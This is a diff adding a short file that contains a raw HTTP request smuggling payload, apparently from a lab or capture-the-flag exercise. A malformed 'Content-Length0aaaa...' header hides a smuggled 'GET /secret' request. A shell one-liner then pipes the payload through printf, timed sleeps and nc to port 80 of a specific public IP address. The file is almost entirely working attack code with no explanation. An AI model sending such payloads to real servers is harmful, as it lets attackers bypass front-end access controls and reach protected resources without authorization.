@@ -1,0 +1,16 @@
+POST / HTTP/1.1
+Host: 34.227.78.164
+Content-Length0aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa:
+Content-Length: 28
+
+GET /secret HTTP/1.1
+DUMMY:GET /test HTTP/1.1
+Host: 34.227.78.164
+
+(printf "POST / HTTP/1.1\r\n"\
+"Host: 34.227.78.164\r\n"\
+"Content-Length0aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa:\r\n"\
+"Content-Length: 28\r\n\r\n"; sleep 1;
+printf "GET /secret HTTP/1.1\r\n"\
+"DUMMY:"; sleep 1; printf "GET /test HTTP/1.1\r\n"\
+"Host: 34.227.78.164\r\n\r\n") | nc 34.227.78.164 80
